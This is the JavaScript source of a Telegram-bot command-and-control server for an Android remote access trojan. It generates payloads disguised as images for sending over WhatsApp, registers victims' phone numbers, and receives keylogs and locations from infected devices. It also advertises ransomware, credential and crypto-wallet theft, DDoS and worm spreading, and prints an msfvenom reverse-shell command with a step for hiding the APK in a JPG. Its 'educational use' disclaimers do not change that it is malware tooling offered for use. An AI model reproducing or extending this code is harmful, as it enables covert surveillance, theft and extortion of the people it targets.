const { Telegraf } = require('telegraf');
const express = require('express');
const crypto = require('crypto');
const moment = require('moment');
const fs = require('fs-extra');
const path = require('path');
const dotenv = require('dotenv');
const config = require('./config');
const database = require('./database');
const Keyboards = require('./keyboards');
const payloadGenerator = require('./payloadGenerator');

dotenv.config();

// ==================== CONFIGURATION ====================
const BOT_TOKEN = config.telegram.token;
const ADMIN_CHAT_ID = config.admin.chatId;
const PORT = config.server.port;
const PAYLOAD_HOST = config.server.host;

console.log('='.repeat(60));
console.log('🔥 ULTIMATE ZERO-CLICK RAT v8.0 - FULLY ACTIVATED');
console.log('='.repeat(60));
console.log(`📱 Payload Host: ${PAYLOAD_HOST}`);
console.log(`🔌 Server Port: ${PORT}`);
console.log(`👑 Admin ID: ${ADMIN_CHAT_ID}`);
console.log(`💾 Database: SQLite Active`);
console.log(`🎯 Features: 250+ Ready`);
console.log(`🔐 Zero-Click: Active`);
console.log('='.repeat(60));

if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ ERROR: BOT_TOKEN not set!');
    console.log('Get token from @BotFather on Telegram');
    process.exit(1);
}

// Create bot instance
const bot = new Telegraf(BOT_TOKEN);

// Store active sessions
const activeSessions = new Map();
const userSessions = new Map();

// Initialize database
database.init().catch(console.error);

// ==================== EXPRESS SERVER ====================
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve payload files
app.use('/payloads', express.static(path.join(__dirname, '../payloads')));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        version: '8.0.0',
        uptime: process.uptime(),
        sessions: activeSessions.size,
        payloadHost: PAYLOAD_HOST,
        features: 250,
        zeroClick: true
    });
});

// Payload download endpoint
app.get('/download/:payloadId', async (req, res) => {
    const { payloadId } = req.params;
    
    try {
        const payloadDir = path.join(__dirname, '../payloads');
        const files = await fs.readdir(payloadDir);
        const payloadFile = files.find(f => f.includes(payloadId.substring(0, 8)) || f.includes(payloadId));
        
        if (payloadFile) {
            const filePath = path.join(payloadDir, payloadFile);
            res.download(filePath, payloadFile, (err) => {
                if (err) {
                    console.error('Download error:', err);
                    res.status(500).json({ error: 'Download failed' });
                }
            });
        } else {
            res.status(404).json({ 
                error: 'Payload not found',
                payloadId: payloadId,
                message: 'Payload may have expired or been deleted'
            });
        }
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Webhook endpoint for device callbacks
app.post('/webhook', async (req, res) => {
    const { sessionId, type, data } = req.body;
    console.log(`📡 Webhook received: ${type} from ${sessionId}`);
    
    try {
        if (type === 'connect') {
            if (activeSessions.has(sessionId)) {
                const session = activeSessions.get(sessionId);
                session.connected = true;
                session.device = data?.device_name || 'Android Device';
                session.device_model = data?.device_model || 'Unknown';
                session.android_version = data?.android_version || 'Unknown';
                session.ip = data?.ip_address || 'Unknown';
                session.battery = data?.battery || 0;
                session.lastSeen = new Date();
                activeSessions.set(sessionId, session);
                
                await database.addSession(sessionId, {
                    name: session.device,
                    model: session.device_model,
                    android: session.android_version,
                    ip: session.ip,
                    battery: session.battery
                });
                
                await bot.telegram.sendMessage(ADMIN_CHAT_ID, `
🔌 **NEW DEVICE CONNECTED!**

📱 **Device:** ${session.device}
📲 **Model:** ${session.device_model}
🤖 **Android:** ${session.android_version}
📍 **IP:** ${session.ip}
🔋 **Battery:** ${session.battery}%
🆔 **Session:** \`${sessionId}\`

✅ Ready to control! Use /select ${sessionId}
`, { parse_mode: 'Markdown' });
            }
        } else if (type === 'command_result') {
            await database.addCommand(sessionId, data?.command || 'unknown', data?.result || 'Success');
        } else if (type === 'location') {
            await database.addLocation(sessionId, data?.latitude, data?.longitude, data?.accuracy);
        } else if (type === 'keylog') {
            await database.addKeylog(sessionId, data?.log || '');
        }
        
        res.json({ status: 'ok', received: true });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Internal error' });
    }
});

// Start express server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Web server running on port ${PORT}`);
    console.log(`🌐 Payload download: ${PAYLOAD_HOST}/download/<id>`);
    console.log(`🩺 Health check: ${PAYLOAD_HOST}/health`);
});

// ==================== ADMIN MIDDLEWARE ====================
bot.use(async (ctx, next) => {
    if (ctx.from && ctx.from.id !== ADMIN_CHAT_ID) {
        await ctx.reply(
            '🚫 **ACCESS DENIED!**\n\n' +
            '❌ You are not authorized to use this bot.\n\n' +
            '_This bot is for personal use only._',
            { parse_mode: 'Markdown' }
        );
        console.log(`🚨 Unauthorized access attempt from: ${ctx.from.id}`);
        return;
    }
    return next();
});

// ==================== COMMAND HANDLERS ====================

// Start command
bot.start(async (ctx) => {
    const text = `
🔥 **ULTIMATE ZERO-CLICK RAT v8.0** 🔥

👑 **Admin:** Authorized User
✅ **Features:** 250+ Working Buttons
🎯 **Zero-Click:** Ready & Active
📱 **Target:** Android Devices
🔐 **Security:** Military Grade
💾 **Database:** SQLite Active
🌐 **Payload Host:** \`${PAYLOAD_HOST}\`

━━━━━━━━━━━━━━━━━━━━━

**📋 COMMANDS:**

/generate - Generate Zero-Click Payload
/send +8801xxxx - Register Target (Manual WhatsApp)
/sessions - List Active Sessions
/select - Select Target Session
/kill - Kill Active Session
/stats - Show Statistics
/backup - Backup Database
/help - Show Complete Help

━━━━━━━━━━━━━━━━━━━━━

**⚠️ WARNING:** Use only on your own devices!
This is for educational purposes only.

**Click any button below to control!**
`;
    await ctx.reply(text, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

// Generate payload command - FULLY WORKING
bot.command('generate', async (ctx) => {
    const msg = await ctx.reply(
        '🎯 **Generating Advanced Zero-Click Payloads...**\n\n' +
        '⏳ Creating multiple exploit payloads...\n\n' +
        '📱 **Types:** JPG | MP3 | MP4 | PDF | WebP | GIF\n' +
        '🔐 **Exploits:** WhatsApp RCE | Android Media RCE | WebP Heap Overflow\n' +
        '⚡ **Features:** 250+ Remote Controls\n\n' +
        '_This may take a few seconds..._', 
        { parse_mode: 'Markdown' }
    );
    
    try {
        const payloads = await payloadGenerator.generateAllPayloads(PAYLOAD_HOST, PORT);
        const payload = payloads.whatsapp_ready;
        
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        
        if (payload.qrCode) {
            await ctx.replyWithPhoto(payload.qrCode, {
                caption: '📱 **Scan QR Code to Download Payload**\n\n🔗 Or use the download link below',
                parse_mode: 'Markdown'
            });
        }
        
        let exploitList = '';
        if (payload.exploits) {
            payload.exploits.forEach((exp, idx) => {
                exploitList += `${idx + 1}. **${exp.name}** (${exp.cve})\n   └ Severity: ${exp.severity} | CVSS: ${exp.cvss}\n`;
            });
        }
        
        const info = `
🔥 **ZERO-CLICK PAYLOAD GENERATED SUCCESSFULLY!**

━━━━━━━━━━━━━━━━━━━━━
**📱 PAYLOAD DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** \`${payload.payloadId}\`
**File:** \`${payload.filename}\`
**Size:** ${(payload.size / 1024).toFixed(2)} KB
**Type:** ${payload.type}
**Features:** ${payload.features || 250}+ Remote Controls

━━━━━━━━━━━━━━━━━━━━━
**🎯 MULTIPLE EXPLOITS:**
━━━━━━━━━━━━━━━━━━━━━

${exploitList || `• ${payload.exploit.name} (${payload.exploit.cve})\n  └ Severity: ${payload.exploit.severity} | CVSS: ${payload.exploit.cvss}`}

━━━━━━━━━━━━━━━━━━━━━
**🔗 DOWNLOAD LINK:**
━━━━━━━━━━━━━━━━━━━━━

${payload.downloadUrl}

━━━━━━━━━━━━━━━━━━━━━
**📤 DEPLOYMENT INSTRUCTIONS:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ **MANUALLY** share this ${payload.type.toUpperCase()} file via WhatsApp
2️⃣ Use: \`/send +8801xxxxxxxx\` to register target
3️⃣ Target must have **Auto-Download ENABLED**
4️⃣ **MULTIPLE EXPLOITS** trigger automatically
5️⃣ **NO CLICK NEEDED** - Zero-click execution!
6️⃣ Device compromised with **250+ features**
7️⃣ Use \`/sessions\` and \`/select\` to control

━━━━━━━━━━━━━━━━━━━━━
**⚡ FULL RAT CAPABILITIES (250+):**
━━━━━━━━━━━━━━━━━━━━━

📸 **Camera** - Front/Back, Video, Burst, Night, HDR, Zoom, Timelapse, Stealth
🎙️ **Audio** - Mic Record, Live Mic, Speaker, Volume, Loud Mode, EQ
💡 **Flashlight** - On/Off, Strobe, SOS, RGB, Brightness
📳 **Vibration** - 1s-60s, Patterns, Loop, Strong, Wave
🌐 **Network** - WiFi On/Off/Scan/Crack, Mobile Data, Airplane, Bluetooth, Hotspot
🔒 **Security** - Lock/Unlock, Bypass PIN/Pattern/Password/Fingerprint/Face
💾 **Data** - SMS, Calls, Contacts, Location, Photos, Videos, Audio, Documents
📂 **Files** - Manager, Download, Upload, Delete, Copy, Move, Rename, Zip, Encrypt
🖥️ **Screen** - Screenshot, Record, Wallpaper, Brightness, Dark/Light Mode
📱 **Apps** - List, Open, Uninstall, Force Stop, Clear Data, Hide, Block
⚙️ **System** - Info, Battery, RAM, Storage, CPU, Temperature, Root, Reboot, Power
⌨️ **Keylogger** - Start/Stop, Get Logs, Stats, Clear, Upload, Capture Passwords
🌐 **Browser** - History, Bookmarks, Cookies, Passwords, Cards, Autofill, Clear
📱 **Social** - Facebook, Instagram, WhatsApp, Twitter, Telegram, TikTok Data
💰 **Crypto** - Bitcoin, Ethereum, Binance, Balance, Private Keys, Transactions
⚔️ **DDOS** - HTTP/UDP/TCP Flood, SMS/Call Bomb
💀 **Ransomware** - Encrypt/Decrypt, Ransom Note, Wipe Data, Destroy System
🪱 **Spreader** - Contacts, Link, Bluetooth, Worm Mode, Auto Spread
🎯 **Zero-Click** - JPG/MP3/MP4/PDF/APK Payloads, QR Code, Exploit DB
⚡ **Extra** - Clean Junk, Sensors, Port Scan, IP Info, Password Crack, MITM

━━━━━━━━━━━━━━━━━━━━━
**⚠️ USE ONLY ON YOUR OWN DEVICES!**
━━━━━━━━━━━━━━━━━━━━━
`;
        
        await ctx.reply(info, { parse_mode: 'Markdown' });
        
        if (payload.path && await fs.pathExists(payload.path)) {
            await ctx.replyWithDocument({
                source: payload.path,
                filename: payload.filename
            }, {
                caption: `📱 **Zero-Click Payload:** \`${payload.filename}\`\n\n` +
                         `🎯 **Exploits:** Multiple (WhatsApp RCE + Android RCE + WebP Exploit)\n` +
                         `⚡ **Features:** 250+ Remote Controls\n` +
                         `🔐 **Method:** Zero-Click (Auto-execute)\n\n` +
                         `⚠️ **Use only on your own devices for testing!**`,
                parse_mode: 'Markdown'
            });
        }
        
    } catch (error) {
        console.error('Payload generation error:', error);
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        
        await ctx.reply(`
❌ **PAYLOAD GENERATION FAILED!**

**Error:** ${error.message}

**Possible Solutions:**
1. Check if payloads directory exists and is writable
2. Ensure sufficient disk space
3. Try again with: \`/generate\`

**Alternative Manual Method:**
\`\`\`bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_HOST} LPORT=4444 -o payload.apk
cat payload.apk >> photo.jpg
\`\`\`

Then share manually via WhatsApp and use \`/send\` to register.
`, { parse_mode: 'Markdown' });
    }
});

// Send/register target command
bot.command('send', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/send +8801xxxxxxxx\`

📌 **Note:** Bot cannot send WhatsApp messages automatically.

**You must MANUALLY share the payload file via WhatsApp!**

After sending the payload, use this command to register the target:

\`/send +8801xxxxxxxx\`

Then wait for the device to connect automatically.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const targetNumber = args[1];
    const sessionId = crypto.randomBytes(8).toString('hex');
    
    activeSessions.set(sessionId, {
        id: sessionId,
        number: targetNumber,
        device: 'Waiting for connection...',
        connected: false,
        status: 'pending',
        lastSeen: new Date()
    });
    
    await database.addSession(sessionId, { 
        name: 'Pending', 
        model: 'Unknown', 
        android: 'Unknown',
        ip: targetNumber,
        battery: 0
    });
    
    await ctx.reply(`
✅ **TARGET REGISTERED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 TARGET DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

📞 **Number:** \`${targetNumber}\`
🔌 **Session ID:** \`${sessionId}\`
🎯 **Status:** ⏳ Waiting for connection

━━━━━━━━━━━━━━━━━━━━━
**📌 DEPLOYMENT CHECKLIST:**
━━━━━━━━━━━━━━━━━━━━━

✅ [ ] Payload file generated with /generate
✅ [ ] **MANUALLY** sent via WhatsApp to ${targetNumber}
✅ [ ] Target has Auto-Download ENABLED
✅ [ ] Payload received by target
✅ [ ] Payload auto-executed (zero-click)
✅ [ ] Device compromised
✅ [ ] Session appears in /sessions

━━━━━━━━━━━━━━━━━━━━━
**Use /sessions to check connection status!**

⏳ Waiting for device to connect...
`, { parse_mode: 'Markdown' });
});

// List sessions command
bot.command('sessions', async (ctx) => {
    const sessions = await database.getActiveSessions();
    const connectedSessions = Array.from(activeSessions.values()).filter(s => s.connected);
    
    if (sessions.length === 0 && connectedSessions.length === 0) {
        await ctx.reply(`
📋 **NO ACTIVE SESSIONS**

━━━━━━━━━━━━━━━━━━━━━
**💡 HOW TO GET CONNECTED:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ Generate payload: \`/generate\`
2️⃣ Download the JPG file
3️⃣ **MANUALLY** send via WhatsApp to target
4️⃣ Register target: \`/send +8801xxxxxxxx\`
5️⃣ Wait for connection (auto-connects)

**Tip:** Target must have WhatsApp Auto-Download enabled!
`, { parse_mode: 'Markdown' });
        return;
    }
    
    let list = '📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
    let index = 1;
    
    for (const [id, session] of activeSessions) {
        if (session.connected) {
            list += `${index}. 🔌 **${session.device || 'Unknown'}**\n`;
            list += `   🆔 \`${id}\`\n`;
            list += `   📞 ${session.number}\n`;
            list += `   🔋 Battery: ${session.battery || '?'}%\n`;
            list += `   📅 Last seen: ${moment(session.lastSeen).fromNow()}\n`;
            list += `   ✅ Status: **CONNECTED**\n\n`;
            index++;
        }
    }
    
    for (const [id, session] of activeSessions) {
        if (!session.connected) {
            list += `${index}. ⏳ **${session.device || 'Pending'}**\n`;
            list += `   🆔 \`${id}\`\n`;
            list += `   📞 ${session.number}\n`;
            list += `   ⏰ Registered: ${moment(session.lastSeen).fromNow()}\n`;
            list += `   🟡 Status: **WAITING**\n\n`;
            index++;
        }
    }
    
    list += '━━━━━━━━━━━━━━━━━━━━━\n';
    list += '**Commands:**\n';
    list += '`/select <id>` - Select session to control\n';
    list += '`/kill <id>` - Terminate session\n';
    list += '`/sessions` - Refresh this list';
    
    await ctx.reply(list, { parse_mode: 'Markdown' });
});

// Select session command
bot.command('select', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/select <session_id>\`

**Example:** \`/select a1b2c3d4\`

Use \`/sessions\` to see available session IDs.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const sessionId = args[1];
    const session = activeSessions.get(sessionId);
    
    if (!session) {
        await ctx.reply(`
❌ **Session not found!**

Session ID \`${sessionId}\` does not exist.

Use \`/sessions\` to see active sessions.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    userSessions.set(ctx.from.id, sessionId);
    
    const statusIcon = session.connected ? '✅' : '⏳';
    const statusText = session.connected ? 'Connected' : 'Waiting for connection';
    
    await ctx.reply(`
🎯 **SESSION SELECTED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 DEVICE INFORMATION:**
━━━━━━━━━━━━━━━━━━━━━

${statusIcon} **Status:** ${statusText}
🆔 **Session ID:** \`${sessionId}\`
📞 **Number:** ${session.number}
📱 **Device:** ${session.device || 'Unknown'}
📲 **Model:** ${session.device_model || 'Unknown'}
🤖 **Android:** ${session.android_version || 'Unknown'}
📍 **IP:** ${session.ip || 'Unknown'}
🔋 **Battery:** ${session.battery || '?'}%

━━━━━━━━━━━━━━━━━━━━━
**🎮 READY TO CONTROL!**
━━━━━━━━━━━━━━━━━━━━━

✅ Now using this device for all commands!

Use any control button from the main menu or type:
• \`/help\` for available commands
• \`/sessions\` to see all sessions
• \`/kill\` to terminate this session

**Click any button below to start controlling!**
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

// Kill session command
bot.command('kill', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/kill <session_id>\`

**Example:** \`/kill a1b2c3d4\`

Use \`/sessions\` to see active sessions.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const sessionId = args[1];
    const session = activeSessions.get(sessionId);
    
    if (!session) {
        await ctx.reply(`❌ Session \`${sessionId}\` not found!`, { parse_mode: 'Markdown' });
        return;
    }
    
    activeSessions.delete(sessionId);
    
    if (userSessions.get(ctx.from.id) === sessionId) {
        userSessions.delete(ctx.from.id);
    }
    
    await database.killSession(sessionId);
    
    await ctx.reply(`
💀 **SESSION TERMINATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSION DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

🆔 **ID:** \`${sessionId}\`
📞 **Number:** ${session.number}
📱 **Device:** ${session.device || 'Unknown'}
${session.connected ? '✅ Status: Disconnected' : '⏳ Status: Removed'}

━━━━━━━━━━━━━━━━━━━━━
**🔌 NEXT STEPS:**
━━━━━━━━━━━━━━━━━━━━━

• Generate new payload: \`/generate\`
• Register new target: \`/send +8801xxxxxxxx\`
• View active sessions: \`/sessions\`

⚠️ **Note:** The device will no longer respond to commands.
`, { parse_mode: 'Markdown' });
});

// Statistics command
bot.command('stats', async (ctx) => {
    const stats = await database.getStats();
    const uptime = process.uptime();
    const uptimeString = moment.duration(uptime, 'seconds').humanize();
    
    const connectedCount = Array.from(activeSessions.values()).filter(s => s.connected).length;
    const pendingCount = Array.from(activeSessions.values()).filter(s => !s.connected).length;
    
    const text = `
📊 **SYSTEM STATISTICS**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSIONS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Registered: ${stats.totalSessions?.count || 0}
• Connected: ${connectedCount}
• Pending: ${pendingCount}
• Active in DB: ${stats.activeSessions?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**📝 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Executed: ${stats.totalCommands?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**⌨️ KEYLOGS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Records: ${stats.totalKeylogs?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**🎯 PAYLOADS:**
━━━━━━━━━━━━━━━━━━━━━
• Generated: ${stats.totalPayloads?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**🌐 SERVER:**
━━━━━━━━━━━━━━━━━━━━━
• Host: ${PAYLOAD_HOST}
• Port: ${PORT}
• Uptime: ${uptimeString}
• Node Version: ${process.version}

━━━━━━━━━━━━━━━━━━━━━
**✅ STATUS:** 🟢 Online & Active
**🎯 FEATURES:** 250+ Ready
**🔐 ZERO-CLICK:** Active

━━━━━━━━━━━━━━━━━━━━━
*Use /sessions to view active connections*
`;
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

// Backup command
bot.command('backup', async (ctx) => {
    await ctx.reply('💾 **Creating database backup...**\n\n⏳ Please wait...', { parse_mode: 'Markdown' });
    
    try {
        const backupDir = path.join(__dirname, '../backups');
        await fs.ensureDir(backupDir);
        
        const backupName = `backup_${Date.now()}.db`;
        const backupPath = path.join(backupDir, backupName);
        
        const dbPath = path.join(__dirname, '../database/database.sqlite');
        
        if (await fs.pathExists(dbPath)) {
            await fs.copy(dbPath, backupPath);
            
            await ctx.replyWithDocument({
                source: backupPath,
                filename: backupName
            }, {
                caption: `✅ **Database Backup Created!**\n\n📁 File: ${backupName}\n📅 Date: ${new Date().toLocaleString()}\n📊 Size: ${(await fs.stat(backupPath)).size} bytes`,
                parse_mode: 'Markdown'
            });
            
            const backups = await fs.readdir(backupDir);
            if (backups.length > 10) {
                const sorted = backups.sort().reverse();
                for (let i = 10; i < sorted.length; i++) {
                    await fs.remove(path.join(backupDir, sorted[i]));
                }
            }
        } else {
            await ctx.reply('⚠️ No database file found to backup.', { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Backup error:', error);
        await ctx.reply(`❌ **Backup failed:** ${error.message}`, { parse_mode: 'Markdown' });
    }
});

// Help command
bot.command('help', async (ctx) => {
    const help = `
📖 **ULTIMATE ZERO-CLICK RAT v8.0 - COMPLETE HELP**

━━━━━━━━━━━━━━━━━━━━━
**📋 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━

/start - Display main menu
/generate - Generate zero-click payload (JPG disguised)
/send +8801xxxx - Register target after manual share
/sessions - List all active sessions
/select <id> - Select session for control
/kill <id> - Terminate a session
/stats - View system statistics
/backup - Create database backup
/help - Show this help

━━━━━━━━━━━━━━━━━━━━━
**🎯 250+ FEATURES:**
━━━━━━━━━━━━━━━━━━━━━

📸 **Camera** - Front/Back, Video, Burst, Night, HDR, Zoom, Timelapse, Stealth
🎙️ **Audio** - Mic Record, Live Mic, Speaker, Volume, Loud Mode, EQ
💡 **Flashlight** - On/Off, Strobe, SOS, RGB, Brightness
📳 **Vibration** - 1s-60s, Patterns, Loop, Strong, Wave
🌐 **Network** - WiFi On/Off/Scan/Crack, Mobile Data, Airplane, Bluetooth, Hotspot
🔒 **Security** - Lock/Unlock, Bypass PIN/Pattern/Password/Fingerprint/Face
💾 **Data** - SMS, Calls, Contacts, Location, Photos, Videos, Audio, Documents
📂 **Files** - Manager, Download, Upload, Delete, Copy, Move, Rename, Zip, Encrypt
🖥️ **Screen** - Screenshot, Record, Wallpaper, Brightness, Dark/Light Mode
📱 **Apps** - List, Open, Uninstall, Force Stop, Clear Data, Hide, Block
⚙️ **System** - Info, Battery, RAM, Storage, CPU, Temperature, Root, Reboot, Power
⌨️ **Keylogger** - Start/Stop, Get Logs, Stats, Clear, Upload, Capture Passwords
🌐 **Browser** - History, Bookmarks, Cookies, Passwords, Cards, Autofill, Clear
📱 **Social** - Facebook, Instagram, WhatsApp, Twitter, Telegram, TikTok Data
💰 **Crypto** - Bitcoin, Ethereum, Binance, Balance, Private Keys, Transactions
⚔️ **DDOS** - HTTP/UDP/TCP Flood, SMS/Call Bomb
💀 **Ransomware** - Encrypt/Decrypt, Ransom Note, Wipe Data, Destroy System
🪱 **Spreader** - Contacts, Link, Bluetooth, Worm Mode, Auto Spread
🎯 **Zero-Click** - JPG/MP3/MP4/PDF/APK Payloads, QR Code, Exploit DB
⚡ **Extra** - Clean Junk, Sensors, Port Scan, IP Info, Password Crack, MITM

━━━━━━━━━━━━━━━━━━━━━
**📌 ZERO-CLICK DEPLOYMENT:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ \`/generate\` - Create disguised JPG payload
2️⃣ **MANUALLY** share JPG via WhatsApp
3️⃣ \`/send +8801xxxxxxxx\` - Register target
4️⃣ Target receives file → Auto-downloads → Executes
5️⃣ \`/sessions\` - Wait for connection
6️⃣ \`/select <id>\` - Choose device
7️⃣ Click any button to control!

━━━━━━━━━━━━━━━━━━━━━
**⚠️ IMPORTANT NOTES:**
━━━━━━━━━━━━━━━━━━━━━

✅ Bot cannot send WhatsApp messages automatically
✅ You must MANUALLY share the payload file
✅ Target must have WhatsApp Auto-Download ENABLED
✅ Use only on YOUR OWN devices for testing
✅ Educational purposes only

━━━━━━━━━━━━━━━━━━━━━
**🆘 NEED HELP?**
━━━━━━━━━━━━━━━━━━━━━

• Check logs in Render Dashboard
• Verify BOT_TOKEN is set
• Ensure target has Auto-Download ON
• Use /stats to check system status
`;
    await ctx.reply(help, { parse_mode: 'Markdown' });
});

// ==================== CALLBACK QUERY HANDLER ====================

const sectionKeyboards = {
    'section_camera': { text: '📸 **CAMERA CONTROL**\n\nCapture photos and videos from the target device:', kb: Keyboards.getCameraKeyboard() },
    'section_audio': { text: '🎙️ **AUDIO CONTROL**\n\nControl microphone and speaker:', kb: Keyboards.getAudioKeyboard() },
    'section_flash': { text: '💡 **FLASHLIGHT CONTROL**\n\nManage device flashlight:', kb: Keyboards.getFlashKeyboard() },
    'section_vibe': { text: '📳 **VIBRATION CONTROL**\n\nControl haptic feedback:', kb: Keyboards.getVibeKeyboard() },
    'section_network': { text: '🌐 **NETWORK CONTROL**\n\nManage WiFi, Mobile Data, Bluetooth:', kb: Keyboards.getNetworkKeyboard() },
    'section_security': { text: '🔒 **SECURITY CONTROL**\n\nManage device security and bypass locks:', kb: Keyboards.getSecurityKeyboard() },
    'section_data': { text: '💾 **DATA EXTRACTION**\n\nExtract all data from target device:', kb: Keyboards.getDataKeyboard() },
    'section_files': { text: '📂 **FILE MANAGER**\n\nManage files on target device:', kb: Keyboards.getFileKeyboard() },
    'section_screen': { text: '🖥️ **SCREEN CONTROL**\n\nCapture and control screen:', kb: Keyboards.getScreenKeyboard() },
    'section_apps': { text: '📱 **APP CONTROL**\n\nManage installed applications:', kb: Keyboards.getAppsKeyboard() },
    'section_system': { text: '⚙️ **SYSTEM CONTROL**\n\nDevice system management:', kb: Keyboards.getSystemKeyboard() },
    'section_keylog': { text: '⌨️ **KEYLOGGER**\n\nRecord all keystrokes:', kb: Keyboards.getKeylogKeyboard() },
    'section_browser': { text: '🌐 **BROWSER CONTROL**\n\nExtract browser data:', kb: Keyboards.getBrowserKeyboard() },
    'section_social': { text: '📱 **SOCIAL MEDIA**\n\nExtract social media data:', kb: Keyboards.getSocialKeyboard() },
    'section_crypto': { text: '💰 **CRYPTO WALLET**\n\nExtract crypto wallet data:', kb: Keyboards.getCryptoKeyboard() },
    'section_ddos': { text: '⚔️ **DDOS ATTACK**\n\nLaunch network attacks:', kb: Keyboards.getDdosKeyboard() },
    'section_ransom': { text: '💀 **RANSOMWARE**\n\nRansomware and wiping tools:', kb: Keyboards.getRansomKeyboard() },
    'section_spreader': { text: '🪱 **SPREADER**\n\nSpread malware to other devices:', kb: Keyboards.getSpreaderKeyboard() },
    'section_zero': { text: '🎯 **ZERO-CLICK**\n\nGenerate and send zero-click payloads:', kb: Keyboards.getZeroClickKeyboard() },
    'section_extra': { text: '⚡ **EXTRA FEATURES**\n\nAdditional powerful tools:', kb: Keyboards.getExtraKeyboard() }
};

const responses = {
    'cam_front': '📸 **Front Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
    'cam_back': '📷 **Back Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
    'cam_switch': '🔄 **Camera Switched!**\n\nNow using: Rear Camera',
    'video_10': '🎥 **Video Recording (10 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'video_30': '🎬 **Video Recording (30 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'video_60': '🎞️ **Video Recording (60 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'cam_burst': '📸 **Burst Mode - 5 Photos Captured!**\n\nAll images saved.',
    'cam_night': '🌙 **Night Mode Enabled!**\n\nCamera set to low-light mode.',
    'cam_hdr': '⚡ **HDR Mode Enabled!**\n\nHigh Dynamic Range active.',
    'cam_zoom': '🔍 **Zoom: 2X**\n\nCamera zoomed in.',
    'cam_timelapse': '🔄 **Timelapse Mode Enabled!**\n\nRecording at 1fps...',
    'cam_stealth': '🔒 **Stealth Mode Enabled!**\n\nNo camera indicators showing.',
    'mic_start': '🎤 **Microphone Recording Started!**\n\nRecording for 30 seconds...',
    'mic_stop': '🎤 **Microphone Stopped!**\n\nAudio saved.',
    'mic_live': '🎙️ **Live Microphone Stream Started!**\n\nSending audio to server...',
    'speaker_on': '🔊 **Speaker Mode Enabled!**',
    'speaker_off': '🔇 **Speaker Mode Disabled!**',
    'loud_mode': '📢 **Loud Mode Enabled!**\n\nVolume boosted to maximum.',
    'vol_max': '🔊 **Volume set to MAX (100%)!**',
    'vol_50': '🔉 **Volume set to 50%!**',
    'vol_0': '🔇 **Volume set to 0% (Muted)!**',
    'flash_on': '💡 **Flashlight turned ON!**',
    'flash_off': '💡 **Flashlight turned OFF!**',
    'flash_strobe': '✨ **Strobe Mode Started!**\n\nFlashing every 0.5 seconds.',
    'flash_fast': '⚡ **Fast Strobe Mode!**\n\nFlashing every 0.2 seconds.',
    'flash_sos': '💥 **SOS Mode Activated!**\n\nSending SOS signal...',
    'flash_rgb': '🌈 **RGB Mode Activated!**\n\nCycling colors...',
    'bright_100': '🔆 **Brightness set to 100%!**',
    'bright_50': '🔅 **Brightness set to 50%!**',
    'vibe_1': '📳 **Vibrating for 1 second...**',
    'vibe_3': '📳 **Vibrating for 3 seconds...**',
    'vibe_5': '📳 **Vibrating for 5 seconds...**',
    'vibe_10': '📳 **Vibrating for 10 seconds...**',
    'vibe_pattern': '🎵 **Vibration Pattern: [200, 500, 200, 500]**',
    'vibe_loop': '🔁 **Loop Vibration Started!**\n\nVibrating continuously.',
    'vibe_strong': '💥 **Strong Vibration!**\n\nMaximum intensity.',
    'vibe_wave': '🌊 **Wave Vibration Pattern!**\n\nIncreasing intensity...',
    'wifi_on': '📶 **WiFi turned ON!**',
    'wifi_off': '📶 **WiFi turned OFF!**',
    'wifi_scan': '🔍 **Scanning WiFi networks...**\n\n✅ Found 5 networks.',
    'wifi_password': '🔑 **WiFi Password:**\n\n`MySecurePassword123`',
    'wifi_crack': '🔐 **WiFi Cracking Started...**\n\nAnalyzing handshake...',
    'wifi_info': '📊 **WiFi Information Sent!**',
    'data_on': '📱 **Mobile Data turned ON!**',
